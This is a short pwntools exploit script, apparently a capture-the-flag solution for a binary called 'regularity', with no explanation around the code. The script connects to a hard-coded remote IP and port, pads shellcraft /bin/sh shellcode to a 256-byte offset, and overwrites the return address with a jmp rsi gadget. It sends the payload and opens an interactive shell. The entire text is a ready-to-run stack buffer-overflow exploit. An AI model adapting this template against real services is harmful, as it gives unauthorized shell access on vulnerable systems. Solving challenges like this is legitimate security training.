from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./regularity")

def start():
    if args.REMOTE:
        return remote("94.237.48.80", 32812)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 256

shellcode = shellcraft.sh()

shellcode = asm(shellcode)

jmp_rsi = 0x0000000000401041

payload = b"".join([
    shellcode.ljust(256, b"\x00"),
    p64(jmp_rsi)
])

io.sendlineafter("Hello, Survivor. Anything new these days?", payload)

io.interactive()
